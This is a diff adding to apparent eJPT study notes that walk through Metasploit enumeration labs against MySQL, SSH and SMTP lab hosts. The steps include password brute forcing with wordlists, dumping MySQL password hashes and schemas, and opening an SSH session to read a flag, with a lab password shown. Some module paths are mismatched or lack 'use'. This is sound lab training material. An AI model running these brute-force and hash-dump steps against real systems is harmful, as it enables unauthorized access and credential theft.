@@ -325,8 +325,6 @@ msf5 > run
 
 > 🔬 [Metasploit - Apache Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=118)
 
-
-
 ```bash
 msf5 > setg RHOSTS 192.50.164.3
 msf5 > workspace -a HTTP_ENUM
@@ -462,9 +460,208 @@ msf5 > run
 
 > 🔬 [Metasploit - MySQL Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=120)
 
+```bash
+msf5 > setg RHOSTS 192.60.96.3
+msf5 > workspace -a MYSQL_ENUM
+```
 
+> `auxiliary/scanner/mysql/mysql_version`
 
+```bash
+msf5 > use auxiliary/mysql/mysql_version
+msf5 > show options
+msf5 > run
+```
 
+<figure><img src="../../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>
 
+> **`auxiliary/admin/mysql/mysql_login`**
 
+```bash
+msf5 > use auxiliary/mysql/mysql_login
+msf5 > show options
+msf5 > set USERNAME root
+msf5 > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+msf5 > set VERBOSE false
+msf5 > run
+```
 
+<figure><img src="../../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>
+
+> **`auxiliary/admin/mysql/mysql_enum`**
+
+```bash
+msf5 > use auxiliary/mysql/mysql_enum
+msf5 > show options
+msf5 > set USERNAME root
+msf5 > set PASSWORD twinkle
+msf5 > run
+```
+
+<figure><img src="../../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>
+
+> **`auxiliary/admin/mysql/mysql_sql`**
+
+```bash
+msf5 > use auxiliary/mysql/mysql_sql
+msf5 > show options
+msf5 > set USERNAME root
+msf5 > set PASSWORD twinkle
+msf5 > run
+```
+
+<figure><img src="../../../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>
+
+<pre class="language-bash"><code class="lang-bash"><strong>msf5 > set SQL show databases;
+</strong>msf5 > run
+</code></pre>
+
+<figure><img src="../../../../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>
+
+> **`auxiliary/scanner/mysql/mysql_file_enum`**
+
+```bash
+msf5 > use auxiliary/mysql/mysql_sql
+msf5 > show options
+msf5 > set USERNAME root
+msf5 > set PASSWORD twinkle
+msf5 > set USER_FILE /usr/share/metasploit-framework/data/wordlists/directory.txt
+msf5 > run
+```
+
+<figure><img src="../../../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>
+
+> **`auxiliary/scanner/mysql/mysql_hashdump`**
+
+```bash
+msf5 > use auxiliary/mysql/mysql_hashdump
+msf5 > show options
+msf5 > set USERNAME root
+msf5 > set PASSWORD twinkle
+msf5 > run
+```
+
+<figure><img src="../../../../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>
+
+> **`auxiliary/scanner/mysql/mysql_schemadump`**
+
+```bash
+msf5 > use auxiliary/mysql/mysql_schemadump
+msf5 > show options
+msf5 > set USERNAME root
+msf5 > set PASSWORD twinkle
+msf5 > run
+```
+
+<figure><img src="../../../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>
+
+> **`auxiliary/scanner/mysql/mysql_writable_dirs`**
+
+```bash
+msf5 > use auxiliary/mysql/mysql_writable_dirs
+msf5 > show options
+msf5 > set USERNAME root
+msf5 > set PASSWORD twinkle
+msf5 > set USER_FILE /usr/share/metasploit-framework/data/wordlists/directory.txt
+msf5 > run
+```
+
+<figure><img src="../../../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>
+
+* Login to databases with credentials obtained in previous.
+
+```bash
+mysql -h 192.60.96.3 -p
+```
+
+### [**SSH**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/ssh-enum)
+
+> 🔬 [Metasploit - SSH Login](https://attackdefense.com/challengedetails?cid=1526)
+
+```bash
+msf5 > setg RHOSTS 192.169.71.3
+msf5 > setg RHOST 192.169.71.3
+msf5 > workspace -a SSH_ENUM
+```
+
+> **`auxiliary/scanner/ssh/ssh_version`**
+
+<pre class="language-bash"><code class="lang-bash">msf5 > search type:auxiliary name:ssh
+<strong>msf5 > auxiliary/scanner/ssh/ssh_version
+</strong>msf5 > show options
+msf5 > run
+</code></pre>
+
+<figure><img src="../../../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>
+
+> **`auxiliary/scanner/ssh/ssh_login`**
+
+```bash
+msf5 > auxiliary/scanner/ssh/ssh_login
+msf5 > show options
+msf5 > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+msf5 > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+msf5 > set STOP_ON_SUCCESS true
+msf5 > set VERBOSE true
+msf5 > run
+```
+
+<figure><img src="../../../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>
+
+* This module sets up SSH sessions. Find the `flag`.
+
+```bash
+msf5 > sessions
+msf5 > sessions -i 1
+/bin/bash -i
+find / -name "flag"
+cat /flag
+    eb09cc6f1cd72756da145892892fbf5a
+```
+
+<figure><img src="../../../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>
+
+> **`auxiliary/scanner/ssh/ssh_enumusers`**
+
+```bash
+msf5 > auxiliary/scanner/ssh/ssh_enumusers
+msf5 > show options
+msf5 > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+msf5 > run
+```
+
+<figure><img src="../../../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>
+
+### [**SMTP**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/smtp-enum)
+
+> 🔬 [SMTP - Postfix Recon: Basics](https://www.attackdefense.com/challengedetails?cid=516)
+
+```bash
+msf5 > setg RHOSTS 192.63.233.3
+msf5 > workspace -a SMTP_ENUM
+```
+
+> **`auxiliary/scanner/smtp/smtp_version`**
+
+```bash
+msf5 > search type:auxiliary name:smtp
+msf5 > auxiliary/scanner/smtp/smtp_version
+msf5 > show options
+msf5 > run
+```
+
+<figure><img src="../../../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>
+
+> **`auxiliary/scanner/smtp/smtp_enum`**
+
+```bash
+msf5 > auxiliary/scanner/smtp/smtp_enum
+msf5 > info
+msf5 > run
+```
+
+<figure><img src="../../../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>
